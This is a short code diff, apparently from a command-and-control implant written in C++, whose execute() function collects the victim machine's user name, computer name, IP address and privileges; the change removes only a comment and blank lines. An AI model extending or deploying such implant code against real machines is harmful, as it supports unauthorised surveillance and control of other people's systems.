@@ -36,7 +36,6 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             json results_parse = GetAll();
             results.append(results_parse.at("userName"));
             results.append(results_parse.at("compName"));
-            // This works but it doesn't fit in the table
             results.append(results_parse.at("ipName"));
             results.append(results_parse.at("Privileges"));
 
@@ -131,8 +130,6 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
    
     return;
 }
-
-
 
 
 /* Executing using command line
